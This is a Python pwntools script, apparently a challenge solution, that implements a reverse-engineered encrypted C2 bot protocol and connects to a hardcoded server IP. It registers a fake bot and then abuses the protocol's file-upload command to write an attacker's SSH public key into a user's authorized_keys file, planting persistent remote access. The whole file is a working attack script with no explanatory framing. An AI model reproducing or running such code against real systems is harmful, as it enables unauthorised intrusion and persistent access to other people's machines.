#!/usr/bin/env python3

import base64
import binascii
import hashlib
import io
import struct
import sys
import time
import uuid

import nacl.exceptions
import nacl.secret
import nacl.public
import nacl.utils
import pwn

log = pwn.log

SERVER_IP = "52.91.233.249"
SERVER_PORT = 6666
SERVER_PUBKEY = nacl.public.PublicKey(binascii.unhexlify("b8e84cc9cded282df1f9fd129c8140202b78dafed2f6038800e4d004f03dc11d"))

pwn.context.endian = "big"

x = lambda d: binascii.hexlify(d).decode()

# used for C2Param.cmd()
class C2Command():
    COMMAND_INIT = b"\x00\x02" # "init"
    COMMAND_UPLOAD = b"\x00\x06" # "file_upload"
    COMMAND_FIN = b"\x00\x07" # "fin"

    COMMAND_GET_TASKING_PATH = b"\x00\x03" # "tasking_dir"
    COMMAND_GET_TASK_IDS = b"\x00\x04" # "dir_list"
    COMMAND_GET_TASK = b"\x00\x05" # "file_download"

    def init(uuid):
        payload = b""
        payload += C2Command.COMMAND_INIT
        payload += C2Param.uuid(uuid)

        return payload
    
    def upload(uuid: uuid.UUID, dirname: bytes, filename: bytes, contents: bytes, more: bool):
        payload = b""
        payload += C2Command.COMMAND_UPLOAD
        payload += C2Param.uuid(uuid)
        payload += C2Param.dirname(dirname)
        payload += C2Param.filename(filename)
        payload += C2Param.contents(contents)
        payload += C2Param.more(more)

        return payload

    def fin():
        return C2Command.COMMAND_FIN
    
    def get_tasking_path(uuid: uuid.UUID):
        payload = b""
        payload += C2Command.COMMAND_GET_TASKING_PATH
        payload += C2Param.uuid(uuid)

        return payload
    
    def get_task_ids(uuid: uuid.UUID, tasking_path: bytes):
        payload = b""
        payload += C2Command.COMMAND_GET_TASK_IDS
        payload += C2Param.uuid(uuid)
        payload += C2Param.dirname(tasking_path)

        return payload
    
    def get_task(uuid: uuid.UUID, tasking_path: bytes, task_id: bytes):
        payload = b""
        payload += C2Command.COMMAND_GET_TASK
        payload += C2Param.uuid(uuid)
        payload += C2Param.dirname(tasking_path)
        payload += C2Param.filename(task_id)

        return payload

class C2Param():
    PARAM_CMD = b"\x69\x00"
    PARAM_UUID = b"\x69\x08"
    PARAM_DIRNAME = b"\x69\x14"
    PARAM_FILENAME = b"\x69\x1c"
    PARAM_CONTENTS = b"\x69\x20"
    PARAM_MORE = b"\x69\x24"
    PARAM_CODE = b"\x69\x28"

    PARAM_TASK_ID = b"\x69\x18"
            
    RESPONSE_CODE_LENGTH = 4

    def _build_std_param(val, contents):
        assert(type(val) == bytes)

        if type(contents) == str:
            contents = contents.encode()

        payload = b""
        payload += val
        payload += pwn.p16(len(contents))
        payload += contents

        return payload

    def cmd(val: bytes):
        if type(val) == str:
            val = val.encode()

        payload = b""
        payload += C2Param.PARAM_CMD
        payload += pwn.p16(2) # length of command
        payload += val

        return payload

    def uuid(val: uuid.UUID):
        valb = val.bytes

        return C2Param._build_std_param(C2Param.PARAM_UUID, valb)

    def dirname(val: bytes):
        if type(val) == str:
            val = val.encode()

        if val[-1] != b"\x00":
            val += b"\x00"
        
        return C2Param._build_std_param(C2Param.PARAM_DIRNAME, val)

    def filename(val: bytes):
        if type(val) == str:
            val = val.encode()

        if val[-1] != b"\x00":
            val += b"\x00"

        return C2Param._build_std_param(C2Param.PARAM_FILENAME, val)
    
    def contents(val: bytes):
        return C2Param._build_std_param(C2Param.PARAM_CONTENTS, val)

    def more(val: bool):
        if val == True:
            valb = b"\x01"
        else:
            valb = b"\x00"

        # if len(val) > 1:
        #     log.warn(f"PARAM_MORE length > 1 ({len(val)})")
        
        return C2Param._build_std_param(C2Param.PARAM_MORE, valb)
    
    def code(val: int):
        val &= 0xffffffff

        # this might need to get LE'd
        return C2Param._build_std_param(C2Param.PARAM_CODE, pwn.p32(val))

    def task_id(val: bytes):
        return C2Param._build_std_param(C2Param.PARAM_TASK_ID, val)

    def _parse_std_param(stream: io.BytesIO):
        l = pwn.u16(stream.read(2))
        v = stream.read(l)

        return v

    def parse(stream: io.BytesIO):
        param = stream.read(2)
        if param == C2Param.PARAM_CODE:
            log.debug("got PARAM_CODE")
            code_length = pwn.u16(stream.read(2))
            if code_length != C2Param.RESPONSE_CODE_LENGTH:
                log.error(f"bad response code length: {code_length}")
                return
        
            code = pwn.u32(stream.read(code_length))
            log.debug(f"response code: {code}")

            return code
        elif param == C2Param.PARAM_DIRNAME:
            log.debug("got PARAM_DIRNAME")

            dirname = C2Param._parse_std_param(stream)

            return dirname.split(b"\x00")[0].decode()
        elif param == C2Param.PARAM_TASK_ID:
            log.debug("got PARAM_TASK_ID")

            task_id = C2Param._parse_std_param(stream)

            return task_id.split(b"\x00")[0].decode()
        elif param == C2Param.PARAM_CONTENTS:
            log.debug("got PARAM_CONTENTS")

            contents = C2Param._parse_std_param(stream)

            return contents
        else:
            log.error(f"unexpected param in C2Param.parse(): {x(param)}")
            return

class C2Packet():
    MAGIC_START = b"\x16\x16\xbf\x7d"
    MAGIC_END = b"\xef\x3b\x1b\xbf"
    
    # asymmetric encryption
    # returns ctxt (which has nonce prepended)
    def _box_encrypt(bot, buf):
        box = nacl.public.Box(bot.client_privkey, SERVER_PUBKEY)

        ctxt = box.encrypt(buf)
        return ctxt

    # symmetric encryption
    # returns ctxt (which has nonce prepended)
    def _secretbox_encrypt(bot, buf):
        box = nacl.secret.SecretBox(bot.session_key)

        ctxt = box.encrypt(buf)
        return ctxt

    # symmetric decryption
    # returns ptxt
    def _secretbox_decrypt(bot, buf):
        box = nacl.secret.SecretBox(bot.session_key)

        ptxt = box.decrypt(buf)

        return ptxt
    
    # add magic and encrypt packet, then send to server
    def send_session_pkt(bot, buf):
        buf = C2Packet.MAGIC_START + buf + C2Packet.MAGIC_END

        log.debug(f"plaintext packet: {x(buf)}")

        ctxt = C2Packet._secretbox_encrypt(bot, buf)

        l = C2Packet._encode_length(len(ctxt))

        bot.server.send(l + ctxt)

    # used to send fingerprint pkt
    def send_handshake_pkt(bot, buf):
        log.debug(f"plaintext packet: {x(buf)}")

        ctxt = C2Packet._box_encrypt(bot, buf)

        l = C2Packet._encode_length(len(ctxt))

        bot.server.send(l + ctxt)

    # decrypt and parse packet from the server
    def get_response(bot):
        # get plaintext
        length = C2Packet._decode_length(bot.server.recv(4))
        pkt = bot.server.recv(length)
        ptxt = C2Packet._secretbox_decrypt(bot, pkt)

        # start parsing
        stream = io.BytesIO(ptxt)

        # check header
        if stream.read(4) != C2Packet.MAGIC_START:
            log.error("got a bad packet from the server")
            return

        ret_vals = []
        while True:
            # parse a param
            param_data = C2Param.parse(stream)
            ret_vals.append(param_data)

            # check if there is more data
            end_bytes = stream.read()
            if end_bytes == C2Packet.MAGIC_END:
                break

            # there was more data, parse again
            stream = io.BytesIO(end_bytes)
        
        return ret_vals

    # encode length in their stupid way
    def _encode_length(length):
        random_bytes = 0x4242 # chosen by fair dice roll
        body_length = length - random_bytes + 0x10000
        return struct.pack(">HH", random_bytes, body_length)

    # decode length in their stupid way
    def _decode_length(length):
        assert(len(length) == 4)

        random_bytes, encoded_len = struct.unpack(">HH", length)
        body_length = encoded_len + random_bytes - 0x10000
        return body_length

class Bot():
    def __init__(self, server):
        # generate fingerprint data
        self.username = "root"
        self.version = "1.2.3.4-XYZ"
        self.version_short = self.version.split("-")[0]
        self.ts = int(time.time())
        self.uuid = uuid.uuid4()

        # generate crypto keys
        self.client_privkey = nacl.public.PrivateKey.generate()
        self.client_pubkey = self.client_privkey.public_key
        self.session_key = hashlib.sha256(f"{self.username}+{self.version_short}+{self.ts}".encode()).digest()

        # remote
        self.server = server

        # received from server
        self.tasking_path = ""

    # build fingerprint string
    # b64("username=$username") + "," + b64("version=$version") + "," + b64("os=$os") + "," + b64("timestamp=$timestamp")
    def _gen_fingerprint_str(self):
        payload = b""
        payload += base64.b64encode(f"username={self.username}".encode())
        payload += b","
        payload += base64.b64encode(f"version={self.version}".encode())
        payload += b","
        payload += base64.b64encode(f"os=Linux".encode())
        payload += b","
        payload += base64.b64encode(f"timestamp={self.ts}".encode())

        return payload

    # send pubkey, fingerprint, and uuid init
    def register(self):
        # send public key
        self.server.send(bytes(self.client_pubkey))

        # send encrypted fingerprint str
        C2Packet.send_handshake_pkt(self, self._gen_fingerprint_str())

        time.sleep(0.5)

        # send init
        C2Packet.send_session_pkt(
            self,
            C2Param.cmd(
                C2Command.init(
                    self.uuid
                )
            )
        )

        return C2Packet.get_response(self)[0]

    def get_tasking_path(self):
        C2Packet.send_session_pkt(
            self,
            C2Param.cmd(
                C2Command.get_tasking_path(self.uuid)
            )
        )

        path = C2Packet.get_response(self)[0]
        self.tasking_path = path
        return path

    def get_task_ids(self, tasking_path=None):
        if tasking_path is None:
            tasking_path = self.tasking_path

        C2Packet.send_session_pkt(
            self,
            C2Param.cmd(
                C2Command.get_task_ids(self.uuid, tasking_path)
            )
        )

        return [x for x in C2Packet.get_response(self) if x != ""]

    def get_task_for_id(self, task_id, tasking_path=None):
        if tasking_path is None:
            tasking_path = self.tasking_path

        C2Packet.send_session_pkt(
            self,
            C2Param.cmd(
                C2Command.get_task(self.uuid, tasking_path, task_id)
            )
        )

        return C2Packet.get_response(self)[0]
    
    def fin(self):
        C2Packet.send_session_pkt(
            self,
            C2Param.cmd(
                C2Command.fin()
            )
        )

        return C2Packet.get_response(self)[0]

    def upload_file(self, dirname, filename, contents):
        # TODO add more support
        assert(len(contents) <= 4000)

        C2Packet.send_session_pkt(
            self,
            C2Param.cmd(
                C2Command.upload(self.uuid, dirname, filename, contents, False)
            )
        )
        
        return C2Packet.get_response(self)[0]

def main(argv):
    server = pwn.remote(SERVER_IP, SERVER_PORT)

    bot = Bot(server)
    log.info(f"bot uuid: {bot.uuid}")
    log.info(f"session key: {x(bot.session_key)}")

    log.info(f"registering bot")
    resp_code = bot.register()

    if resp_code == 0:
        log.success("successfully registered bot")
    else:
        log.error(f"failed to register bot (resp code: {resp_code})")

    bot.get_tasking_path()

    # upload SSH key
    pubkey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOzPLhmwNwL3ImIStUO7ls7JTb9eMCFZc7MprAKGQ/Bu geech@zw-pc-win\n"
    code = bot.upload_file("/home/lpuser/.ssh", "authorized_keys", pubkey)
    log.info(f"upload code: {code}")

    if bot.fin() == 0:
        log.success("fin'd bot")
    else:
        log.error("didn't fin bot")

    return 0

if __name__ == "__main__":
    sys.exit(main(sys.argv))